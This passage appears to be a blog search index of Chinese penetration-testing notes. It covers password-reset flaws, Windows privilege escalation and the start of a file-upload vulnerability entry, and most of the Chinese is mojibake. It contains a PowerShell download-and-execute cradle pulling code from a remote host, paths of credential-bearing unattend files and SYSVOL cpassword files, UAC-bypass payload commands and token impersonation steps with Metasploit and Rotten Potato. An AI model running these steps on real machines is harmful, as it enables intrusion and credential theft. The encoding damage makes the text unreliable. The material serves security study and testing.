ç­‰ï¼Œæœ€åå¡«å†™ç”¨æˆ·åæ—¶å†™ adminï¼Œè¿™æ—¶é€’äº¤ä¸Šå»çš„è¡¨å•å°±æ˜¯åŒ…å«æ–°å¯†ç ç­‰ä¸€åˆ‡æ•°æ®çš„ admin ç”¨æˆ·ï¼Œåæœå°±æ˜¯ä¼šè‡ªåŠ¨è¦†ç›–è¿‡å»çš„ admin ç”¨æˆ·çš„ä¿¡æ¯å¹¶å·²ç»ç™»å½•æˆåŠŸäº† 0x08.session è¦†ç›– ç”¨ä¸åŒè´¦å·åœ¨åŒä¸€ä¸ªæµè§ˆå™¨è¿›è¡Œä¸¤æ¬¡è´¦å·å‘é€ç»™é‚®ç®±çš„é‡ç½®å¯†ç é“¾æ¥çš„æ“ä½œï¼Œç„¶ååœ¨åŒä¸€ä¸ªæµè§ˆå™¨é‡Œæ‰“å¼€ç¬¬äºŒä¸ªé“¾æ¥ï¼ŒæœåŠ¡å™¨ä¼šä»¥ä¸ºç¬¬äºŒä¸ªé“¾æ¥çš„ç”¨æˆ·æ˜¯ç¬¬ä¸€ä¸ªçš„ï¼Œæ‰€ä»¥ä¼šé—´æ¥é‡ç½®ç¬¬ä¸€ä¸ªç”¨æˆ·çš„å¯†ç ","link":"/2019/11/11/%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E/"},{"title":"ç®€æ˜“ææƒçŸ¥è¯†ç‚¹æ€»ç»“","text":"ç³»ç»Ÿå†…æ ¸æº¢å‡ºæ¼æ´æ‰‹åŠ¨æ‰§è¡Œå‘ç°ç¼ºå¤±è¡¥ä¸ å½“è·å–åˆ°ç›®æ ‡æœºå™¨çš„ shell ä»¥åï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤æ¥çœ‹ç³»ç»Ÿå®‰è£…äº†å“ªäº›è¡¥ä¸ï¼Œè¿˜å…·æœ‰å“ªäº›æ¼æ´ 1234whoami /groups //æ ¹æ®ä¸‹é¢çš„Mandatory Label\\Medium Mandatory Level æ¥çœ‹è‡ªå·±æ˜¯ä¸€ä¸ªä»€ä¹ˆæƒé™systeminfo //æŸ¥çœ‹å½“å‰ç³»ç»Ÿå®‰è£…äº†å“ªäº›è¡¥ä¸wmic qfe get Caption,Description,HotFixID,InstalledOn //æŸ¥çœ‹å½“å‰ç³»ç»Ÿå®‰è£…äº†å“ªäº›è¡¥ä¸ ä½¿ç”¨ä¸Šä¼ æˆ–è€…[[powershell]]çš„ä¸‹è½½åŠŸèƒ½æ¥å°† exp æ”¾åˆ°ç›®æ ‡æœºé‡Œè¾¹ 1powershell -nop -exec bypass -c &quot;IEX(New-Object Net.WebClient).DownloadString('192.168.1.1');æ‰§è¡Œçš„ä»£ç ã€‚ã€‚ã€‚&quot; é€šè¿‡è”ç½‘æŸ¥è¯¢å¾—çŸ¥å¹¶ä¸”åˆ©ç”¨ EXP åº“ [[Metasploit]]ä¸­çš„ enum_patches [[Metasploit#post windows gather enum_patches]] Windows Exploit Suggester Powershell çš„ Sherlock è„šæœ¬ Windows ç³»ç»Ÿé…ç½®é”™è¯¯ç›´æ¥è·å–ç³»ç»Ÿå®‰è£…çš„é…ç½®æ–‡ä»¶æ¦‚è¿° ç½‘ç»œç®¡ç†å‘˜åœ¨ç»™ä¸€å †æœºå™¨å®‰è£…åŒä¸€ç¯å¢ƒæ—¶ï¼Œä¼šä½¿ç”¨è„šæœ¬è°ƒç”¨å›ºå®šçš„å®‰è£…é…ç½®æ–‡ä»¶è¿›è¡Œå®‰è£…ï¼Œæœ‰çš„æ—¶å€™å›åŒ…å«ç®¡ç†å‘˜è´¦å·å¯†ç ç­‰ä¿¡æ¯ å¸¸è§æ•æ„Ÿå®‰è£…é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š 1234567891011C:\\sysprep.infC:\\sysprep\\sysprep.xmlC:\\Windows\\system32\\sysprep.infC:\\Windows\\system32\\sysprep\\sysprep.xmlC:\\unattend.xmlC:\\Windows\\Panther\\Unattend.xmlC:\\Windows\\Panther\\Unattended.xmlC:\\Windows\\Panther\\Unattend\\Unattended.xmlC:\\Windows\\Panther\\Unattend\\Unattend.xmlC:\\Windows\\System32\\Sysprep\\unattend.xmlC:\\Windows\\System32\\Sysprep\\Panther\\unattend.xml å¤šç§åˆ©ç”¨æ–¹å¼ ç›´æ¥ä½¿ç”¨ dir ç›¸å…³å‘½ä»¤æœç´¢ 1dir /b /s c:\\Unattend.xml [[Metasploit#post windows gather enum_unattend]] ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯æ¦‚è¿° Windows ç³»ç»ŸæœåŠ¡æ–‡ä»¶åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶åŠ è½½å¹¶æ‰§è¡Œï¼Œå¹¶åœ¨åå°æŒç»­è°ƒç”¨å¯æ‰§è¡Œæ–‡ä»¶ã€‚è€Œå¦‚æœä¸€ä¸ªä½æƒé™ç”¨æˆ·å¯¹æ­¤ç±»æ–‡ä»¶å…·æœ‰å†™æƒé™ï¼ˆå³å¯ä»¥æ›´æ”¹å®ƒï¼‰ï¼Œé‚£ä¹ˆå°±ä¼šé€ æˆå®‰å…¨éšæ‚£ã€‚ æœåŠ¡æœªè¿è¡Œï¼šæ”»å‡»è€…ä½¿ç”¨ä»»æ„æœåŠ¡æ›¿æ¢åŸæ¥çš„æœåŠ¡ï¼Œå¹¶é‡å¯æœåŠ¡æœåŠ¡è¿è¡Œä¸­ä¸”æ— æ³•è¢«ç»ˆæ­¢ï¼šå¤§å¤šæ•°ç¯å¢ƒå¦‚æ­¤ï¼Œæ”»å‡»è€…ä¼šåˆ©ç”¨ DLL åŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡æ¥ææƒ å¤šç§åˆ©ç”¨æ–¹å¼ Power Empire ä¸ Powersploit çš„ Powerup è„šæœ¬ æ­¤è„šæœ¬ä¼šåˆ—å‡ºæœåŠ¡æƒé™é…ç½®é”™è¯¯çš„æ¼æ´ï¼Œä¸”ä¸‹é¢çš„ AbuseFunction é‡Œä¼šæœ‰éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ [[Metasploit#exploit windows local service_permissions]] æ³¨å†Œè¡¨é”® AlwaysInstallElevatedæ¦‚è¿° è¿™ä¸ªç­–ç•¥è®¾ç½®é¡¹ä¸€æ—¦å¼€å¯ï¼ŒWindows å°†å…è®¸ä»»ä½•æƒé™ç”¨æˆ·ä»¥ NT AUTHORITY\\SYSTEM çš„èº«ä»½æ¥å®‰è£…æ¶æ„ MSI MSI å³ Microsoft Windows Installerï¼ŒåŒå‡» MSI ç¨‹åºå°±ä¼šè‡ªåŠ¨è°ƒç”¨ Windows è‡ªå¸¦çš„ Msiexec.exeï¼ˆè¿™ä¸ªé‡Œè¾¹åŒ…å«äº†å¤§é‡å®‰è£…å’Œå¸è½½è½¯ä»¶æ—¶éœ€è¦ä½¿ç”¨çš„æŒ‡ä»¤ä¸æ•°æ®ï¼‰ è¿™ä¸ªç­–ç•¥é€šè¿‡ gpedit.msc ä¸­çš„å¦‚ä¸‹æ“ä½œæ‰“å¼€ï¼šç»„ç­–ç•¥-&gt;è®¡ç®—æœºé…ç½®-&gt;ç®¡ç†æ¨¡æ¿-&gt;Windows ç»„ä»¶-&gt;Windows Installer-&gt;æ°¸è¿œä»¥é«˜ç‰¹æƒå®‰è£…ï¼šé€‰æ‹©å¯ç”¨ç»„ç­–ç•¥-&gt;ç”¨æˆ·é…ç½®-&gt;ç®¡ç†æ¨¡æ¿-&gt;Windows ç»„ä»¶-&gt;Windows Installer-&gt;æ°¸è¿œä»¥é«˜ç‰¹æƒå®‰è£…ï¼šé€‰æ‹©å¯ç”¨ ç„¶åæ³¨å†Œè¡¨ä¼šåœ¨å¦‚ä¸‹ä¸¤ä¸ªä½ç½®ä¸Šè‡ªåŠ¨åˆ›å»ºå€¼ï¼š1HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevatedHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated å¤šç§åˆ©ç”¨æ–¹å¼ åˆ©ç”¨ Powerup çš„ Get-RegistryAlwaysInstallElevated æ¨¡å—æ¥æ£€æµ‹æ­¤æ³¨å†Œè¡¨é”®æ˜¯å¦è¢«è®¾ç½® ç„¶ååˆ©ç”¨ Powerup çš„ Write-UserAddMSI æ¨¡å—ï¼Œç”Ÿæˆä¸€ä¸ª Useradd.msi çš„ MSI æ–‡ä»¶ï¼Œç„¶ååªè¦ä»¥ä½æƒé™æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œå°±ä¼šå¾®ç³»ç»Ÿæ·»åŠ ä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ· å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´æ¦‚è¿° æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹éƒ½æœ‰æƒé™ï¼Œå½“ç”¨æˆ·è‡ªèº«çš„æƒé™é«˜äºå®ƒå°±å¯ä»¥è®¿é—®ï¼Œä½äºå°±ä¸è¡Œã€‚æ¯”æ–¹è¯´ç”¨æˆ·è‡ªèº«çš„æƒé™å¾ˆä½ï¼Œè€Œå‡è®¾ C: \\Program Files\\Some Folder\\test_service.exe è¿™ä¸ªå¯æ‰§è¡ŒæœåŠ¡ç¨‹åºçš„æƒé™å¾ˆé«˜ï¼Œä¸”æ»¡è¶³äº†è°ƒç”¨æœåŠ¡è·¯å¾„æœªè¢«å¼•å·åŒ…è£¹ï¼ˆå¯ä»¥é€šè¿‡ wmic æŸ¥æ˜ï¼‰å¹¶æœ‰ç©ºæ ¼åœ¨å…¶ä¸­ï¼ŒWindows ä¼šä»¥æœ¬å±äº test_service.exe çš„é«˜æƒé™å»ä¾æ¬¡æŸ¥è¯¢æœ‰æ²¡æœ‰ C: \\Program.exe C: \\Program Files\\Some.exe æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨å°±ç›´æ¥ç”¨é«˜æƒé™æ‰§è¡Œäº†ã€‚ï¼ˆç›¸å½“äº Windows æ˜¯ä»¥ç©ºæ ¼åšä¸€ä¸ªæˆªæ–­ï¼‰ æ‰€ä»¥æˆ‘ä»¬åªè¦æ„é€ ä¸€ä¸ªå­˜åœ¨æ­¤æ¼æ´çš„æœåŠ¡çš„æ¶æ„è·¯å¾„æ–‡ä»¶åæ¯”æ–¹è¯´ä¸Šé¢çš„ C: \\Program Files\\Some.exe å®é™…ä¸Šæ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶ï¼Œé‡å¯é‚£ä¸ªæ­£å¸¸æœåŠ¡å°±ä¼šä»¥é«˜æƒé™æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ–‡ä»¶äº† åˆ©ç”¨æ–¹å¼ä¸€ï¼š ä½¿ç”¨ wmic æ¥å…ˆåˆ—å‡ºæ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥ä¸”æœ‰ç©ºæ ¼çš„æœåŠ¡è·¯å¾„ 1wmic service get name,displayname,pathname,startmode |findstr /i &quot;AUTO&quot; |findstr /i /v &quot;C:\\Windows\\\\&quot; |findstr /i /v &quot;&quot;&quot; æ¥ä¸‹æ¥åˆ©ç”¨ icacls æ£€æµ‹æ˜¯å¦å¯¹é‚£ä¸ªæœ‰ç©ºæ ¼çš„ç›®å½•æœ‰å†™æƒé™ 1icacls &quot;C:\\Program Files\\Some folder&quot; å¦‚æœæœ‰ Everyone åˆ™è¯´æ˜ç”¨æˆ·å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æœ‰å®Œå…¨æ§åˆ¶æƒé™ï¼Œæ‹¬å·åé¢çš„å­—ç¬¦è§£é‡Šå¦‚ä¸‹è¡¨æ ¼ å­—ç¬¦ å«ä¹‰ (M) ä¿®æ”¹ (F) å®Œå…¨æ§åˆ¶ (CI) ä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ (OI) ä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹ ç„¶åå°†é‡å‘½åè¿‡åçš„æ¶æ„æ–‡ä»¶æ”¾åˆ°å­˜åœ¨é—®é¢˜çš„ç›®å½•ä¸‹ï¼Œå¹¶ä½¿ç”¨ sc é‡å¯æœåŠ¡å°±å¥½äº† 12sc stop service_namesc start service_name åˆ©ç”¨æ–¹å¼äºŒï¼š [[Metasploit#exploit windows local unquoted_service_path]] è®¡åˆ’ä»»åŠ¡ Windows è¿è¡Œæ—¶ä¼šæœ‰ä¸€äº›è®¡åˆ’ä»»åŠ¡ï¼Œå¦‚æœæ”»å‡»è€…å¯¹é‚£äº›ä»¥é«˜æƒé™è¿è¡Œçš„ä»»åŠ¡çš„ç›®å½•æ–‡ä»¶æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆç”¨æ¶æ„æ–‡ä»¶å°†å…¶æ›¿æ¢ï¼Œç³»ç»Ÿä¾¿ä¼šä»¥é«˜æƒé™è¿è¡Œé‚£ä¸ªæ¶æ„æ–‡ä»¶ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ï¼š 1schtasks /query /fo LIST /v` åˆ©ç”¨æ–¹å¼ AccessChk è¿™ä¸ªè½¯ä»¶æ˜¯ Windows è‡ªå·±å‘å¸ƒçš„ï¼Œå¸¸ç”¨äºç®¡ç†ä¸æ’é™¤æ•…éšœæ“ä½œï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸ä¼šå¼•èµ·æ€è½¯çš„æŠ¥è­¦ 12345678910111213//ç¬¬ä¸€æ¬¡è¿è¡ŒSysInternalså·¥å…·åŒ…çš„è½¯ä»¶ä¼šå¼¹å‡ºä¸€ä¸ªåè®®è®¸å¯å¯¹è¯æ¡†å¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æ¥è‡ªåŠ¨æ¥å—è®¸å¯åè®®accesschk.exe /accepteula //æŸ¥çœ‹æŸæ–‡ä»¶å¤¹æƒé™é…ç½®æƒ…å†µaccesschk.exe -dqv &quot;C:\\Users&quot; -accepteula //åˆ—å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶å¤¹accesschk.exe -uwdqsUsersc:\\accesschk.exe -uwdqs&quot;AuthenticatedUsers&quot;c:\\//åˆ—å‡ºæŸä¸ªé©±åŠ¨å™¨ä¸‹æ‰€æœ‰æƒé™é…ç½®æœ‰ç¼ºé™·çš„æ–‡ä»¶accesschk.exe -uwqsUsersc:\\*.*accesschk.exe -uwqs&quot;AuthenticatedUsers&quot;c:\\*.* ç»„ç­–ç•¥é¦–é€‰é¡¹é—®é¢˜åˆ›å»ºä¸€ä¸ªç»„ç­–ç•¥å¹¶æ‰¹é‡ä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜å¯†ç  åˆ›å»º[[åŸŸ]]ç¯å¢ƒåï¼Œä¸€èˆ¬æƒ…å†µä¸‹åŸŸå†…æœºå™¨éƒ½æ˜¯è¦ç”¨è‡ªå·±çš„å¯†ç ç™»å½•ï¼Œè€Œä¸ºäº†æå‡æœ¬åœ°ç®¡ç†å‘˜å¯†ç çš„å®‰å…¨æ€§ï¼Œå¾€å¾€ä¼šæ‰¹é‡ä¿®æ”¹è¿™ä¸ªå¯†ç  æ­¥éª¤æ˜¯ï¼šåˆ›å»ºç»„ç­–ç•¥-&gt;æ›´æ–°ç»„ç­–ç•¥ä¸­çš„é¦–é€‰é¡¹å¯†ç -&gt;å°† Domain Computers ç»„æ·»åŠ åˆ°éªŒè¯ç»„ç­–ç•¥å¯¹è±¡åˆ—è¡¨ä¸­-&gt;å°†æ–°å»ºçš„ç»„ç­–ç•¥åº”ç”¨åˆ°åŸŸä¸­æ‰€æœ‰çš„éåŸŸæ§æœºå™¨ä¸Š è™½ç„¶è°ƒé«˜äº†å®‰å…¨æ€§ï¼Œä½†æ˜¯åŸŸä¸­æ‰€æœ‰æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç éƒ½æ˜¯ç›¸åŒçš„äº† è·å–ç»„ç­–ç•¥å‡­æ®æ¦‚è¿° å¾€å¾€åœ¨ç®¡ç†å‘˜æ–°å»ºäº†ç»„ç­–ç•¥ä¹‹åï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨ SYSVOL å…±äº«ç›®å½•ä¸­ç”Ÿæˆä¸€ä¸ª[[XML]]æ–‡ä»¶æ¥ä¿å­˜ä¿®æ”¹è¿‡åçš„å¯†ç ï¼Œè¿™ä¸ªå¯†ç ä½¿ç”¨ AES-256 åŠ å¯†ç®—æ³•ï¼Œå®‰å…¨æ€§è¿˜æ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯ 2012 å¹´å¾®è½¯å®˜æ–¹å…¬å¸ƒäº†è¯¥å¯†ç çš„ç§é’¥ï¼Œé‚å®‰å…¨æ€§é™ä½ ç›®æ ‡æ˜¯æ‰¾åˆ°åŒ…å« cpassword çš„ XML æ–‡ä»¶ å¤šç§åˆ©ç”¨æ–¹å¼ æ‰‹åŠ¨æŸ¥æ‰¾ cpassword 1234//ä½¿ç”¨typeå‘½ä»¤ç›´æ¥æœç´¢è®¿é—®XMLæ–‡ä»¶type \\\\dc\\sysvol\\pentest.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml//ç„¶åä½¿ç”¨gpprefdecrypt.pyæ¥è¿›è¡Œè§£å¯†å³å¯ PowerSploit æä¾›çš„ Get-GPPPassword è„šæœ¬ [[Metasploit#post windows gather credentials gpp]] ç»•è¿‡ UAC ææƒæ¦‚è¿° UACï¼Œå³ User Account Controlï¼Œåœ¨æƒé™ä¸å¤Ÿçš„æƒ…å†µä¸‹è®¿é—® C: \\ã€Windowsã€Program Files ç±»ä¼¼ç›®å½•éƒ½éœ€è¦è¿›è¡Œ UAC è®¤è¯æ‰èƒ½è¿›è¡Œã€‚ UAC è§„å®šäº†é«˜ã€ä¸­ã€ä½ä¸‰ä¸ªå®‰å…¨æ§åˆ¶ç­–ç•¥ï¼Œé«˜ç­‰çº§è¿›ç¨‹æœ‰ç®¡ç†å‘˜æƒé™ï¼Œä¸­ç­‰çº§è¿›ç¨‹æœ‰æ™®é€šç”¨æˆ·æƒé™ï¼Œä½ç­‰çº§è¿›ç¨‹æƒé™æ˜¯æœ€æœ‰é™çš„ UAC æœ‰å¦‚ä¸‹å››ç§è®¾ç½®è¦æ±‚ï¼š å§‹ç»ˆé€šçŸ¥ï¼šæœ€ä¸¥æ ¼çš„è®¾ç½®ï¼Œæ¯å½“ç¨‹åºéœ€è¦ä½¿ç”¨é«˜çº§åˆ«æƒé™éƒ½ä¼šæç¤ºæœ¬åœ°ç”¨æˆ· ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºç¨‹åºæ—¶é€šçŸ¥æˆ‘ ï¼šUAC çš„é»˜è®¤è®¾ç½®ï¼Œæœ¬åœ° Windows ç¨‹åºä½¿ç”¨é«˜æƒé™æ—¶ä¸é€šçŸ¥ï¼Œç¬¬ä¸‰æ–¹ä½¿ç”¨æ—¶é€šçŸ¥ ä»…åœ¨ç¨‹åºè¯•å›¾æ›´æ”¹æˆ‘çš„è®¡ç®—æœºç¨‹åºæ—¶é€šçŸ¥æˆ‘ï¼ˆä¸é™ä½æ¡Œé¢äº®åº¦ï¼‰ï¼šä¸é»˜è®¤ç›¸ä¼¼ï¼Œä½†ä¸é™ä½æ¡Œé¢äº®åº¦ ä»ä¸æç¤ºï¼šå½“ç”¨æˆ·æ˜¯ç³»ç»Ÿç®¡ç†å‘˜æ—¶ï¼Œæ‰€æœ‰ç¨‹åºéƒ½ä¼šä»¥æœ€é«˜æƒé™è¿è¡Œ éœ€è¦ UAC æˆæƒæ‰èƒ½è¿›è¡Œçš„æ“ä½œ é…ç½® Windows Update å¢åŠ /åˆ é™¤è´¦æˆ· æ›´æ”¹è´¦æˆ·ç±»å‹ æ›´æ”¹ UAC è®¾ç½® å®‰è£… ActiveX å®‰è£…/å¸è½½ç¨‹åº å®‰è£…è®¾å¤‡é©±åŠ¨ç¨‹åº å°†æ–‡ä»¶ç§»åŠ¨/å¤åˆ¶åˆ° Program Files æˆ–è€… Windows ç›®å½•ä¸‹ æŸ¥çœ‹å…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶å¤¹ åˆ©ç”¨æ–¹å¼bypassuac æ¨¡å—å‡è®¾å·²ç»æ‹¿åˆ°äº†ç›®æ ‡çš„ä¸€ä¸ª meterpreter çš„ shellï¼Œä½†æ˜¯æƒé™æ˜¯æ™®é€šç”¨æˆ·ï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ææƒä¸ºç®¡ç†å‘˜ç”¨æˆ·ç›´æ¥ä½¿ç”¨[[Metasploit#exploit windows local bypassuac]]æ¨¡å—å³å¯ï¼ˆåˆ«å¿˜äº†å¡«å…¥ä¹‹å‰ meterpreter çš„ sessionï¼‰ ![[Metasploit#exploit windows local bypassuac]] Runas æ¨¡å—![[Metasploit#exploit windows local ask]] Nishang çš„ Invoke-PsUACme æ¨¡å—12345678910//ä½¿ç”¨Sysprepæ–¹æ³•æ‰§è¡Œé»˜è®¤çš„PayloadInvoke-PsUACme -Verbose //ä½¿ç”¨oobeæ–¹æ³•å¹¶é»˜è®¤æ‰§è¡ŒpayloadInvoke-PsUACme -method oobe -Verbose //ä½¿ç”¨-Payloadå‚æ•°ï¼Œå¯ä»¥è‡ªå®šè¦æ‰§è¡Œçš„payloadInvoke-PsUACme -method oobe -Payload &quot;powershell -windowstyle hidden -e YourEncodedPayload&quot; è¿˜å¯ä»¥ä½¿ç”¨-PayloadPathæ¥æŒ‡å®šPayloadè·¯å¾„ï¼Œä½¿ç”¨-CustomDll64æˆ–è€…-CustomDll32æ¥è‡ªå®šä¹‰DLLæ–‡ä»¶ Empire ä¸­çš„ bypassuac æ¨¡å— bypassuac æ¨¡å— 12345usemodule privesc/bypassuac //ä½¿ç”¨æ¨¡å—set Listener resek4 //è®¾ç½®ç›‘å¬å‚æ•°execute //æ‰§è¡Œ bypassuac_wscript æ¨¡å— åªé€‚ç”¨äº Windows7ï¼Œå°šæœªæœ‰è¡¥ä¸ï¼Œä½†æ˜¯æ€è½¯ä¼šæç¤º 12345usemodule privesc/bypassuac_wscript //ä½¿ç”¨æ¨¡å—set Listener resek4 //è®¾ç½®ç›‘å¬å‚æ•°execute //æ‰§è¡Œ ä»¤ç‰Œçªƒå–æ¦‚è¿° ä»¤ç‰Œï¼ˆTokenï¼‰æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶ç§˜é’¥ï¼Œç›¸å½“äºè´¦æˆ·ä¸å¯†ç ï¼Œåªè¦ä¸é‡å¯ç³»ç»Ÿï¼Œè·å¾—äº†ä»¤ç‰Œå°±å¯ä»¥åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„æƒ…å†µä¸‹è®¿é—®ç½‘ç»œä¸ç³»ç»Ÿèµ„æºï¼Œä¸€èˆ¬æ¥è¯´ä»¤ç‰Œéšæœºæ€§ä¸ä¸å¯é¢„æµ‹æ€§å¾ˆé«˜ï¼Œæ”»å‡»è€…å¾ˆéš¾çŒœå‡ºæ¥ ä»¤ç‰Œåˆ†ä¸ºï¼š è®¿é—®ä»¤ç‰Œï¼ˆAccess Tokenï¼‰ä»£è¡¨è®¿é—®æ§åˆ¶æ“ä½œä¸»ä½“çš„è®¿é—®å¯¹è±¡ å¯†ä¿ä»¤ç‰Œï¼ˆSecurity Tokenï¼‰åˆå«åšâ€œè®¤è¯ä»¤ç‰Œâ€æˆ–â€œç¡¬ä»¶ä»¤ç‰Œâ€ï¼Œä¾‹å¦‚ï¼šU ç›¾ ä¼šè¯ä»¤ç‰Œï¼ˆSession Tokenï¼‰æ˜¯äº¤äº’ä¼šè¯çš„å”¯ä¸€èº«ä»½æ ‡è¯†ç¬¦ ä¼ªé€ ä»¤ç‰Œçš„æ ¸å¿ƒä¸º Kerberos åè®®ï¼Œåœ¨ç¬¬ 4 æ­¥æœåŠ¡å™¨å‘é€ç»™å®¢æˆ·ç«¯ä»¤ç‰Œåï¼Œæ”»å‡»è€…å…¥ä¾µæœåŠ¡å™¨æ¥çªƒå–é‚£ä¸ªä»¤ç‰Œ åˆ©ç”¨æ–¹å¼ä»¤ç‰Œçªƒå–å‡è®¾å·²ç»è·å–äº†ç›®æ ‡æœºå™¨çš„ metepreter çš„ shellï¼Œä¾æ¬¡åœ¨ metepreter ä¸­æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ 12345678use incognito list_token -u //åˆ—å‡ºå¯ç”¨ä»¤ç‰Œ//åˆ—å‡ºçš„ä»¤ç‰Œåˆ†ä¸¤ç§ï¼Œä¸€ç§æ˜¯Delegation Tokensæˆæƒä»¤ç‰Œï¼Œæ”¯æŒäº¤äº’å¼ç™»å½•ï¼ˆä¾‹å¦‚è¿œç¨‹æ¡Œé¢ï¼‰//å¦ä¸€ç§æ˜¯Impersonation Tokensæ¨¡æ‹Ÿä»¤ç‰Œï¼Œæ”¯æŒéäº¤äº’å¼çš„å¯¹è¯//ä»¤ç‰Œçš„æ•°é‡å–å†³äºshellçš„è®¿é—®çº§åˆ«ï¼Œä»¤ç‰Œçš„æ ¼å¼ä¸ºï¼šæœºå™¨å\\ç”¨æˆ·åimpersonate_token WIN-57TJ21312UGE\\\\Administrator //ç”¨ä¼ªé€ çš„ä»¤ç‰Œè¿›è¡Œè®¿é—®shell //ç”¨ä¼ªé€ çš„èº«ä»½å¼€å¯shellï¼Œè¿™ä¸ªæ—¶å€™è¿”å›çš„éš§é“å°±æ˜¯ç®¡ç†å‘˜çš„äº†ï¼Œå¯ä»¥ç”¨whoamiæŸ¥çœ‹ Rotten Potato ææƒå’Œä¸Šä¸€æ­¥ä¸€æ ·ï¼Œæ‰§è¡Œåˆ° list_token -u åˆ—å‡ºä»¤ç‰Œçš„æ­¥éª¤ï¼Œç„¶åä¸‹è½½ Rotten Potatoè¯¥è½¯ä»¶ç›®å½•é‡Œæœ‰ä¸ª rottenpotato.exeï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ 1234upload /root/RottenPotato/rottenpotato.exe //ä¸Šä¼ åˆ°ç›®æ ‡æœºå™¨execute -HC -f rottenpotato.exeimpersonate_token &quot;NT AUTHORITY\\\\SYSTEM&quot; //è¿™æ—¶å€™å†ä½¿ç”¨getuidå·²ç»å¯ä»¥çœ‹è§æƒé™æå‡äº† Empire ä¸‹çš„ mimikatz è¿è¡Œ mimikatzï¼Œè¾“å…¥ creds å¯ä»¥æŸ¥çœ‹ Empire åˆ—ä¸¾å‡ºæ¥çš„å¯†ç  ä½¿ç”¨ pth æ¯”æ–¹è¯´ï¼špth 7 æ¥é€‰æ‹©è‡ªå·±è¦çªƒå–çš„ä»¤ç‰Œ åŒæ—¶å¯ä»¥ä½¿ç”¨ ps å‘½ä»¤æŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰åŸŸç”¨æˆ·çš„è¿›ç¨‹æ­£åœ¨è¿è¡Œ è·å–ä»¤ç‰Œåï¼Œå¯ä»¥ä½¿ç”¨ revtoself å‘½ä»¤æ¥æ¢å¤ä»¤ç‰Œæƒé™ æ— å‡­è¯æ¡ä»¶ä¸‹çš„æƒé™è·å–æ¦‚è¿°[[LLMNR]]![[LLMNR]] NetBIOSNet-NTLM Hashåˆ©ç”¨æ–¹å¼ Responder","link":"/2021/02/19/%E6%8F%90%E6%9D%83/"},{"title":"File upload vulnerability Summary","text":"æ–‡ä»¶ä¸Šä¼ å®ç°HTML ä»£ç å¦‚ä¸‹ï¼š 12345678910111213&lt;!--é¦–å…ˆHTMLä¼šå¦‚ä¸‹å†™ï¼Œç„¶åæœåŠ¡å™¨ç«¯æœ‰ä¸€ä¸ªserver.phpï¼Œç”¨æ¥æ¥æ”¶å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶--&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;upload picture more once&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;1.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--è¿™é‡Œactionå†™é‚£ä¸ªå¤„ç†çš„1.phpï¼Œmethodå†™post--&gt;&lt;p&gt;Pictures:&lt;br /&gt;&lt;input type=&quot;file&quot; name=&quot;2333&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;upload&quot; value=&quot;Send&quot; /&gt;&lt;/p&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; å‡è®¾æˆ‘ä»¬æäº¤äº†ä¸€ä¸ªå†™ç€ phpinfo() çš„ php æ–‡ä»¶ï¼Œç„¶åè¿™ä¸ª HTML ä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ä»¥å¦‚ä¸‹å‘åŒ…æ–¹å¼å‘è¿‡å» 1234567891011------WebKitFormBoundary5cOINdf9NfnWclrCContent-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;1.php&quot; Content-Type: application/octet-stream #è¿™é‡Œçš„Content-Typeå†³å®šäº†æœªæ¥ä¼ åˆ°1.phpä¸­çš„$_FILES['upload_file']['type']é‡Œçš„typeå€¼&lt;?php phpinfo();?&gt;------WebKitFormBoundary5cOINdf9NfnWclrCContent-Disposition: form-data; 